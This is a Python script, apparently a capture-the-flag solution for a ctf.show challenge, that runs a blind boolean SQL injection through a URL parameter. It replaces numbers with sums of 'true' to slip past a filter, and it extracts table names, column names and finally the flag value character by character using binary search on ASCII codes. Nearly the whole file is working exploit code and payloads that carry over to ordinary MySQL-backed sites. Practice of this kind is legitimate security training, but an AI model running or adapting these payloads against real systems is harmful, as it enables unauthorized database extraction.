import requests
import time
url = 'http://01bdca38-b397-4584-94dc-5e5c7f406ebd.challenge.ctf.show/api/?u='
str = ''
def num2true(num):
    str = '(' + 'true%2b' * (num-1) + 'true)'
    return str
a = num2true(1)
# print(a)
for i in range(1, 60):
    min,max = 32, 128
    while True:
        j = min + (max-min)//2
        if(min == j):
            str += chr(j)
            print(str)
            break
        # 爆表名
        # payload = f"if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{num2true(i)},true))<{num2true(j)},username,true)"
        # 爆列
        # payload = f"if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagas'),{num2true(i)},true))<{num2true(j)},username,true)"
        # 爆值
        payload = f"if(ascii(substr((select group_concat(flagasabc) from ctfshow_flagas),{num2true(i)},true))<{num2true(j)},username,true)"
        r = requests.get(url=url+payload).text
        # print(r)
        if 'passwordAUTO' in r:
            max = j
        else:
            min = j